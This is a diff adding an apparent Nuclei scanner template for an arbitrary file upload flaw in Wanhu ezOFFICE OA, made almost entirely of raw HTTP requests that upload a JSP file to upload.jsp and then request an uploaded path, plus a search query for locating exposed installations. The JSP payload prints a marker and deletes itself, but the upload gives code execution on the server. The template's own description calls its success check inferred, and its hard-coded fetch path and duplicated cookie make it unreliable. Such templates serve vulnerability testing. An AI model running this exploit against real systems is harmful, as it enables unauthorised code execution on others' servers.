@@ -1,0 +1,64 @@
+id: poc-dd9feb19a90ca7835403
+info:
+  name: 万户协同办公平台portletSettingId存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dd9feb19a90ca783540316c5fe054d0a
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dd9feb19a90ca783540316c5fe054d0a
+    fofa: + hunter`app.name="万户 Ezoffice OA"`
+http:
+- raw:
+  - 'POST /defaultroot/platform/portal/layout/common/upload.jsp?portletSettingId=123&path=dir HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+
+    Content-Length: 286
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Content-Type: multipart/form-data; boundary=----othotlvgwwannsrjurc6
+
+    Cookie: OASESSIONID=416B4CE965CD27DEED8197A8528A33E6
+
+
+    ------othotlvgwwannsrjurc6
+
+    Content-Disposition: form-data; name="file"; filename="hc0qc.jsp"
+
+    Content-Type: application/octet-stream
+
+
+    <%out.println("m7kmpz4ucpdtkbld4sxy");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------othotlvgwwannsrjurc6--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /defaultroot/upload/dir/202312/2023121622252900709344996.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Cookie: OASESSIONID=416B4CE965CD27DEED8197A8528A33E6; OASESSIONID=D4E78F785F0A319A594DC801BBB486AD'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
